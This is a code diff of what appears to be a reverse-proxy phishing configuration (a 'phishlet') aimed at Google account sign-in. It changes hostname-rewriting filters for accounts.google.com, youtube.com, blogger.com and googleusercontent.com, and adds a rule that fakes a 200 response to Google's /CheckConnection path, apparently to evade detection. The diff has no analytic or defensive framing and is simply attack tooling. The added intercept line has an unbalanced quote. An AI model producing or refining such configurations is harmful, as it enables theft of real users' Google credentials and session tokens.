@@ -101,11 +101,9 @@ sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'blogger.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'blogger.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
-  # - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  # - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  # - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'pmpo=https://accounts.{hostname}', replace: 'pmpo=https://accounts.youtube', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
   - {triggers_on: 'accounts.google.com', orig_sub: 'lh3', domain: 'googleusercontent.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'lh3', domain: 'googleusercontent.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
@@ -155,3 +153,5 @@ js_inject:
         }
         return str.join("&");
       }
+intercept:
+  - {domain: 'accounts.google.com', path: ^\/CheckConnection', http_status: 200}
